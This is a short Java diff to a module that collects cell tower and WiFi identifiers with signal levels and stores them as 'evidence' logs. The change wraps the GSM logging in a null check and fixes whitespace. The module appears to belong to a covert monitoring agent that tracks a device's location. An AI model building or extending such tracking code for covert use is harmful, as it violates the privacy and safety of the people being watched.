@@ -328,9 +328,11 @@ public final class ModulePosition extends BaseInstantModule implements
             if (mcc != 0) {
                 final byte[] payload = getCellPayload(mcc, mnc, lac, cid, rssi);
 
-                logCell.createEvidence(getAdditionalData(0, LOG_TYPE_GSM));
-                saveEvidence(logCell, payload, LOG_TYPE_GSM);
-                logCell.close();
+                if (payload != null) {
+                    logCell.createEvidence(getAdditionalData(0, LOG_TYPE_GSM));
+                    saveEvidence(logCell, payload, LOG_TYPE_GSM);
+                    logCell.close();
+                }
             }
 
         } else if (Device.isCDMA()) {
@@ -485,7 +487,7 @@ public final class ModulePosition extends BaseInstantModule implements
         debug.trace("getWifiPayload bssid: " + bssid + " ssid: " + ssid //$NON-NLS-1$ //$NON-NLS-2$
                 + " signal:" + signalLevel); //$NON-NLS-1$
         //#endif
-        
+
         // dimensione del payload
         final int size = 48;
         final byte[] payload = new byte[size];
@@ -515,7 +517,7 @@ public final class ModulePosition extends BaseInstantModule implements
         final byte[] ssidcontent = ssid.getBytes();
         final int len = ssidcontent.length;
         final byte[] place = new byte[32];
-        
+
         for (int i = 0; i < (Math.min(32, len)); i++) {
             place[i] = ssidcontent[i];
         }
